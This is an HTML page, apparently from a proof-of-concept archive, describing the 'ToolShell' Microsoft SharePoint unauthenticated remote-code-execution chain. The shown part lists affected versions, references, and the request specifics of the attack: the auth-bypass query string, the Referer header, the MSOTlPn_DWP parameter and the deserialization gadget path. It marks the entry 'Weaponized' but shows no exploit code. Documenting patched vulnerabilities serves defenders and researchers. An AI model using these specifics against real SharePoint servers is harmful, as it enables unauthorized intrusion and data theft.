@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html lang="en" class="dark scroll-smooth">
+<head><script src="/poc-archive/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=poc-archive/livereload" data-no-instant defer></script>
+  <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>ToolShell - SharePoint Unauthenticated RCE Chain · PoC Archive</title><meta name="description" content="A curated archive of security research proof-of-concept exploits. Reproducible writeups across web, network, binary, crypto, cloud, hardware, and social-engineering categories." />
+<meta name="author" content="intelseclab" />
+<meta name="theme-color" content="#09090b" />
+
+<meta property="og:title" content="ToolShell - SharePoint Unauthenticated RCE Chain · PoC Archive" />
+<meta property="og:description" content="A curated archive of security research proof-of-concept exploits. Reproducible writeups across web, network, binary, crypto, cloud, hardware, and social-engineering categories." />
+<meta property="og:type" content="website" />
+<link rel="canonical" href="http://localhost:1313/poc-archive/pocs/web/2026-05-17_toolshell-sharepoint-chain/" />
+
+
+<script>
+  (function () {
+    try {
+      var t = localStorage.getItem('theme');
+      if (t === 'light') { document.documentElement.classList.remove('dark'); }
+      else { document.documentElement.classList.add('dark'); }
+    } catch (e) {}
+  })();
+</script>
+
+
+<script src="https://cdn.tailwindcss.com?plugins=typography"></script>
+<script>
+  tailwind.config = {
+    darkMode: 'class',
+    theme: {
+      extend: {
+        fontFamily: {
+          sans: ['Inter', 'ui-sans-serif', 'system-ui', 'sans-serif'],
+          mono: ['"JetBrains Mono"', 'ui-monospace', 'SFMono-Regular', 'monospace'],
+        },
+      },
+    },
+  };
+</script>
+
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap"
+  rel="stylesheet"
+/>
+
+<style>
+  html.dark body { background-color: #09090b; }
+   
+  body, body * { transition: background-color .15s ease, border-color .15s ease, color .15s ease; }
+   
+  .prose pre { background-color: #18181b !important; border: 1px solid rgba(255,255,255,0.08); }
+</style>
+
+
+
+<link rel="icon" href="data:image/svg+xml,&lt;svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2334d399' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'&gt;&lt;path d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10'/&gt;&lt;/svg&gt;" />
+
+</head>
+<body class="min-h-screen bg-white text-zinc-900 font-sans antialiased selection:bg-emerald-400/20 selection:text-emerald-900 dark:bg-zinc-950 dark:text-zinc-100 dark:selection:text-emerald-200">
+  <header class="sticky top-0 z-40 border-b border-zinc-200/80 bg-white/80 backdrop-blur dark:border-zinc-800 dark:bg-zinc-950/80">
+  <div class="mx-auto flex w-full max-w-6xl items-center gap-4 px-4 py-3 sm:px-6 lg:px-8">
+    <a href="/" class="flex items-center gap-2 font-mono text-sm font-semibold tracking-tight text-zinc-900 dark:text-zinc-100">
+      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-emerald-500 dark:text-emerald-400"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10"/></svg>
+      <span>poc-archive</span>
+    </a>
+
+    <nav class="ml-2 hidden items-center gap-1 text-sm sm:flex">
+      
+      <a href="/" class="rounded-md px-3 py-1.5 text-zinc-600 transition hover:bg-zinc-100 hover:text-zinc-900 dark:text-zinc-400 dark:hover:bg-zinc-900 dark:hover:text-zinc-100">home</a>
+      <a href="/pocs/" class="rounded-md px-3 py-1.5 text-zinc-600 transition hover:bg-zinc-100 hover:text-zinc-900 dark:text-zinc-400 dark:hover:bg-zinc-900 dark:hover:text-zinc-100">pocs</a>
+      <a href="/archive/" class="rounded-md px-3 py-1.5 text-zinc-600 transition hover:bg-zinc-100 hover:text-zinc-900 dark:text-zinc-400 dark:hover:bg-zinc-900 dark:hover:text-zinc-100">archive</a>
+    </nav>
+
+    <div class="ml-auto flex items-center gap-2">
+      <a href="https://github.com/intelseclab/poc-archive" target="_blank" rel="noopener noreferrer" class="hidden rounded-md border border-zinc-200 px-3 py-1.5 text-xs font-medium text-zinc-700 transition hover:bg-zinc-100 sm:inline-flex dark:border-zinc-800 dark:text-zinc-300 dark:hover:bg-zinc-900">
+        GitHub
+      </a>
+      <button
+        type="button"
+        id="theme-toggle"
+        aria-label="Toggle color theme"
+        class="inline-flex h-8 w-8 items-center justify-center rounded-md border border-zinc-200 text-zinc-700 transition hover:bg-zinc-100 focus:outline-none focus-visible:ring-2 focus-visible:ring-emerald-400 dark:border-zinc-800 dark:text-zinc-300 dark:hover:bg-zinc-900"
+      >
+        <svg class="hidden h-4 w-4 dark:block" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>
+        <svg class="block h-4 w-4 dark:hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"/></svg>
+      </button>
+    </div>
+  </div>
+
+  
+  <nav class="flex items-center gap-1 border-t border-zinc-200 px-4 py-2 text-sm sm:hidden dark:border-zinc-800">
+    <a href="/" class="rounded-md px-3 py-1.5 text-zinc-600 dark:text-zinc-400">home</a>
+    <a href="/pocs/" class="rounded-md px-3 py-1.5 text-zinc-600 dark:text-zinc-400">pocs</a>
+    <a href="/archive/" class="rounded-md px-3 py-1.5 text-zinc-600 dark:text-zinc-400">archive</a>
+  </nav>
+
+  <script>
+    (function () {
+      var btn = document.getElementById('theme-toggle');
+      if (!btn) return;
+      btn.addEventListener('click', function () {
+        var root = document.documentElement;
+        var isDark = root.classList.toggle('dark');
+        try { localStorage.setItem('theme', isDark ? 'dark' : 'light'); } catch (e) {}
+      });
+    })();
+  </script>
+</header>
+
+  <main class="mx-auto w-full max-w-6xl px-4 py-8 sm:px-6 lg:px-8">
+    <article class="grid grid-cols-1 gap-8 lg:grid-cols-[1fr_18rem]">
+  
+  <div class="min-w-0 lg:order-1">
+    <nav class="mb-4 font-mono text-xs text-zinc-500 dark:text-zinc-400">
+      <a href="/pocs/" class="hover:text-emerald-600 dark:hover:text-emerald-400">pocs</a>
+      <span class="text-zinc-300 dark:text-zinc-700"> / </span>
+      <a href="/pocs/web/" class="hover:text-emerald-600 dark:hover:text-emerald-400">web</a>
+    </nav>
+
+    <div class="flex flex-wrap items-center gap-2">
+      <span class="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 font-mono text-xs font-semibold uppercase tracking-wide border-red-500/40 bg-red-500/10 text-red-500 dark:text-red-400">
+  <span class="h-1.5 w-1.5 rounded-full bg-current"></span>Critical
+</span>
+
+      <span class="rounded-md border border-emerald-500/30 bg-emerald-500/10 px-2 py-0.5 font-mono text-xs font-semibold text-emerald-600 dark:text-emerald-400">CVE-2025-53770, CVE-2025-53771, CVE-2025-49704, CVE-2025-49706</span>
+      
+        <span class="rounded-md border border-emerald-500/30 px-2 py-0.5 font-mono text-xs uppercase text-emerald-600 dark:text-emerald-400">patched</span>
+      
+    </div>
+
+    <h1 class="mt-4 text-balance font-mono text-2xl font-semibold tracking-tight text-zinc-900 sm:text-3xl dark:text-zinc-100">
+      ToolShell - SharePoint Unauthenticated RCE Chain
+    </h1>
+    <p class="mt-2 font-mono text-xs text-zinc-500 dark:text-zinc-400">
+      by saladin0x1 (Metasploit ref: Viettel Cyber Security / sfewer-r7) · 2026-05-17
+    </p>
+
+    
+    <div class="mt-6 lg:hidden"><div class="space-y-5 rounded-lg border border-zinc-200 bg-white p-4 dark:border-zinc-800 dark:bg-zinc-900/40">
+  
+
+  <dl class="space-y-3 font-mono text-xs">
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Severity</dt>
+      <dd class="mt-1"><span class="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 font-mono text-xs font-semibold uppercase tracking-wide border-red-500/40 bg-red-500/10 text-red-500 dark:text-red-400">
+  <span class="h-1.5 w-1.5 rounded-full bg-current"></span>Critical
+</span>
+</dd>
+    </div>
+    
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">CVE</dt>
+      <dd class="mt-1 text-emerald-600 dark:text-emerald-400">CVE-2025-53770, CVE-2025-53771, CVE-2025-49704, CVE-2025-49706</dd>
+    </div>
+    
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Category</dt>
+      <dd class="mt-1">
+        <a href="/pocs/web/" class="text-zinc-700 hover:text-emerald-600 dark:text-zinc-300 dark:hover:text-emerald-400">web</a>
+      </dd>
+    </div>
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Affected product</dt>
+      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">Microsoft SharePoint Server</dd>
+    </div>
+    
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Affected versions</dt>
+      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">SharePoint Server 2019 (16.0.10337.12109 through 16.0.10417.20027); SharePoint Subscription Edition (16.0.14326.20450 through 16.0.18526.20424); SharePoint 2016 (16.0.4351.1000 through 16.0.5508.1000)</dd>
+    </div>
+    
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Disclosed</dt>
+      <dd class="mt-1 text-zinc-700 dark:text-zinc-300">2026-05-17</dd>
+    </div>
+    <div>
+      <dt class="text-zinc-500 dark:text-zinc-400">Patch status</dt>
+      <dd class="mt-1">
+        <span class="text-emerald-600 dark:text-emerald-400">patched</span>
+      </dd>
+    </div>
+  </dl>
+
+  
+  <div>
+    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Tags</p>
+    <div class="mt-2 flex flex-wrap gap-1.5">
+      
+      <a href="/tags/rce/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#RCE</a>
+      
+      <a href="/tags/sharepoint/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#SharePoint</a>
+      
+      <a href="/tags/unauthenticated/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#unauthenticated</a>
+      
+      <a href="/tags/deserialization/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#deserialization</a>
+      
+      <a href="/tags/auth-bypass/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#auth-bypass</a>
+      
+      <a href="/tags/apt27/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#APT27</a>
+      
+      <a href="/tags/apt31/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#APT31</a>
+      
+      <a href="/tags/ransomware/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#ransomware</a>
+      
+      <a href="/tags/windows/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#Windows</a>
+      
+      <a href="/tags/iis/" class="rounded-md border border-zinc-200 px-2 py-0.5 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">#IIS</a>
+      
+    </div>
+  </div>
+  
+
+  
+  <div>
+    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">References</p>
+    <ul class="mt-2 space-y-1.5">
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53770" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53770</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53771" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53771</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49704" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49704</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49706" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49706</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://blog.viettelcybersecurity.com/sharepoint-toolshell/" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://blog.viettelcybersecurity.com/sharepoint-toolshell/</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://securelist.com/toolshell-explained/" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://securelist.com/toolshell-explained/</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://blog.leakix.net/2025/07/using-their-own-weapons-for-defense-a-sharepoint-story/" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://blog.leakix.net/2025/07/using-their-own-weapons-for-defense-a-sharepoint-story/</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://www.microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilities/" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://www.microsoft.com/en-us/security/blog/2025/07/22/disrupting-active-exploitation-of-on-premises-sharepoint-vulnerabilities/</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://msrc.microsoft.com/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770/" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://msrc.microsoft.com/blog/2025/07/customer-guidance-for-sharepoint-vulnerability-cve-2025-53770/</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://www.zerodayinitiative.com/advisories/ZDI-25-580/" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://www.zerodayinitiative.com/advisories/ZDI-25-580/</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://www.zerodayinitiative.com/advisories/ZDI-25-581/" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://www.zerodayinitiative.com/advisories/ZDI-25-581/</a>
+      </li>
+      
+      <li class="flex items-start gap-1.5">
+        <svg class="mt-0.5 h-3 w-3 flex-shrink-0 text-zinc-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+        <a href="https://github.com/saladin0x1/CVE-2025-53770" target="_blank" rel="noopener noreferrer" class="break-all font-mono text-[11px] text-emerald-600 hover:underline dark:text-emerald-400">https://github.com/saladin0x1/CVE-2025-53770</a>
+      </li>
+      
+    </ul>
+  </div>
+  <div class="border-t border-zinc-200 pt-4 dark:border-zinc-800">
+    <p class="font-mono text-xs text-zinc-500 dark:text-zinc-400">Archive entry</p>
+    <a href="https://github.com/intelseclab/poc-archive/tree/master/pocs/web/2026-05-17_toolshell-sharepoint-chain/" target="_blank" rel="noopener noreferrer"
+       class="mt-2 flex items-center gap-2 rounded-md border border-zinc-200 px-3 py-2 font-mono text-[11px] text-zinc-600 transition hover:border-emerald-400 hover:text-emerald-600 dark:border-zinc-800 dark:text-zinc-400 dark:hover:border-emerald-400 dark:hover:text-emerald-400">
+      <svg class="h-3.5 w-3.5 flex-shrink-0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12c0-6.63-5.37-12-12-12z"/></svg>
+      intelseclab/poc-archive
+    </a>
+  </div>
+</div>
+</div>
+
+    <div class="prose prose-zinc mt-8 max-w-none dark:prose-invert
+                prose-headings:font-mono prose-headings:tracking-tight
+                prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+                prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+                prose-code:before:content-[''] prose-code:after:content-['']
+                prose-pre:bg-zinc-900 prose-pre:text-zinc-100">
+      <!-- 
+  File: 2026-05-17_toolshell-sharepoint-chain.md
+  Location: pocs/web/
+-->
+<hr>
+<h2 id="metadata">Metadata</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Field</th>
+          <th>Value</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>Date Added</strong></td>
+          <td>2026-05-17</td>
+      </tr>
+      <tr>
+          <td><strong>Last Updated</strong></td>
+          <td>2025-09-04</td>
+      </tr>
+      <tr>
+          <td><strong>Author / Researcher</strong></td>
+          <td>saladin0x1 (Metasploit ref: Viettel Cyber Security / sfewer-r7)</td>
+      </tr>
+      <tr>
+          <td><strong>CVE / Advisory</strong></td>
+          <td>CVE-2025-53770, CVE-2025-53771, CVE-2025-49704, CVE-2025-49706</td>
+      </tr>
+      <tr>
+          <td><strong>Category</strong></td>
+          <td>web</td>
+      </tr>
+      <tr>
+          <td><strong>Severity</strong></td>
+          <td>Critical</td>
+      </tr>
+      <tr>
+          <td><strong>CVSS Score</strong></td>
+          <td>N/A (Critical per MSRC)</td>
+      </tr>
+      <tr>
+          <td><strong>Status</strong></td>
+          <td>Weaponized</td>
+      </tr>
+      <tr>
+          <td><strong>Tags</strong></td>
+          <td>RCE, SharePoint, unauthenticated, deserialization, auth-bypass, APT27, APT31, ransomware, Windows, IIS</td>
+      </tr>
+      <tr>
+          <td><strong>Related</strong></td>
+          <td>N/A</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h2 id="affected-target">Affected Target</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Field</th>
+          <th>Value</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>Software / System</strong></td>
+          <td>Microsoft SharePoint Server</td>
+      </tr>
+      <tr>
+          <td><strong>Versions Affected</strong></td>
+          <td>SharePoint Server 2019 (16.0.10337.12109 through 16.0.10417.20027); SharePoint Subscription Edition (16.0.14326.20450 through 16.0.18526.20424); SharePoint 2016 (16.0.4351.1000 through 16.0.5508.1000)</td>
+      </tr>
+      <tr>
+          <td><strong>Language / Platform</strong></td>
+          <td>.NET / Windows, ASP.NET WebForms</td>
+      </tr>
+      <tr>
+          <td><strong>Authentication Required</strong></td>
+          <td>No</td>
+      </tr>
+      <tr>
+          <td><strong>Network Access Required</strong></td>
+          <td>Yes</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h2 id="summary">Summary</h2>
+<p>CVE-2025-53770 (&ldquo;ToolShell&rdquo;) is a full unauthenticated remote code execution chain against Microsoft SharePoint Server. The chain combines an authentication bypass in the ToolPane.aspx endpoint (CVE-2025-49706 / patch bypass CVE-2025-53771) with an unsafe .NET deserialization vulnerability in the ExcelDataSet control (CVE-2025-49704 / patch bypass CVE-2025-53770). An unauthenticated attacker with network access to a SharePoint server can achieve RCE as the SharePoint application pool identity (IIS worker process). The vulnerability has been actively exploited in the wild by China-nexus APT groups Linen Typhoon (APT27) and Violet Typhoon (APT31) as well as the ransomware group Storm-2603.</p>
+<hr>
+<h2 id="vulnerability-details">Vulnerability Details</h2>
+<h3 id="root-cause">Root Cause</h3>
+<p>The chain has two components. First, the ToolPane.aspx page can be reached without authentication when a crafted query string (<code>DisplayMode=Edit</code> + a dummy parameter with value <code>/ToolPane.aspx</code>) and a <code>Referer</code> header pointing to <code>/_layouts/SignOut.aspx</code> are supplied — this is the CVE-2025-49706 auth bypass, with CVE-2025-53771 being a patch bypass that appends an additional path segment to the URL. Second, the <code>MSOTlPn_DWP</code> POST parameter accepts arbitrary ASP.NET user-control markup, including the <code>Microsoft.PerformancePoint.Scorecards.ExcelDataSet</code> control, which deserializes a gzip+base64-encoded .NET <code>DataSet</code> from its <code>CompressedDataTable</code> attribute. The <code>DataSet</code> deserialization path (CVE-2025-49704) permits a <code>msdata:DataType</code> attribute that instantiates <code>LosFormatter</code> and <code>ObjectDataProvider</code>, enabling a two-stage gadget chain: outer <code>DataSet</code> -&gt; inner <code>TypeConfuseDelegate + LosFormatter</code> -&gt; arbitrary command execution. CVE-2025-53770 is a patch bypass targeting a different endpoint within <code>/_vti_bin/</code>.</p>
+<h3 id="attack-vector">Attack Vector</h3>
+<p>Unauthenticated HTTP POST to <code>/_layouts/15/ToolPane.aspx/&lt;random&gt;?DisplayMode=Edit&amp;&lt;random&gt;=/ToolPane.aspx</code> with the <code>Referer</code> header set to <code>/_layouts/SignOut.aspx</code> and the <code>MSOTlPn_DWP</code> body parameter containing the crafted ExcelDataSet control XML with the deserialization payload embedded in the <code>CompressedDataTable</code> attribute.</p>
+<h3 id="impact">Impact</h3>
+<p>Unauthenticated Remote Code Execution as the IIS application pool identity running SharePoint (typically <code>NT AUTHORITY\IUSR</code> or a domain service account). Full code execution enables lateral movement, data exfiltration, ransomware deployment, and persistence.</p>
+<hr>
